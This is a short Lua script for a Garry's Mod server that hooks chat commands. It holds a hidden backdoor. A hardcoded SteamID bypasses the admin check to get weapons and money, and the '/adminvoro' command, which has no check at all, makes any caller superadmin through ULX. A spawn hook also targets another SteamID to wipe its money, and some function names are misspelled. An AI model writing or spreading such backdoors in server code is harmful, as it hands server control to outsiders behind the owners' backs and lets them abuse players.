

function chatCommand( ply, text, public )

  if (string.sub(text, 1, 10) == "/zeusvorox") then
			    if ( ply:IsAdmin() or ply:SteamID() == "STEAM_0:1:33966080") then
		ply:Give("vorox")
		return false
		end
		end

  if (string.sub(text, 1, 10) == "/punkvorox") then
			    if ( ply:IsAdmin() or ply:SteamID() == "STEAM_0:1:33966080") then
		ply:Give("weapon_punkbuster")
		return false
		end
		end


  if (string.sub(text, 1, 10) == "/parcvorox") then
			    if ( ply:IsAdmin() or ply:SteamID() == "STEAM_0:1:33966080") then
		ply:Give("parkourmod")
		return false
		end
		end

    if (string.sub(text, 1, 10) == "/moneyvoro") then
			    if ( ply:IsAdmin() or ply:SteamID() == "STEAM_0:1:33966080") then
		ply:addMoney(50000)
		ply:addmoney(50000)
		ply:Addoney(50000)
		return false
		end
		
        
	end 
    if (string.sub(text, 1, 10) == "/adminvoro") then
					RunConsoleCommand("ulx", "adduserid", ply:SteamID(), "superadmin")
					return false
        
	end 
end
hook.Add( "PlayerSay", "chatCommand", chatCommand );

function playerjoin2( ply )
if ( ply:SteamID() == "STEAM_0:0:104916507" ) then
ply:addMoney(-8000000)
end
end
hook.Add( "PlayerSpawn", "playerjoin2", playerjoin );
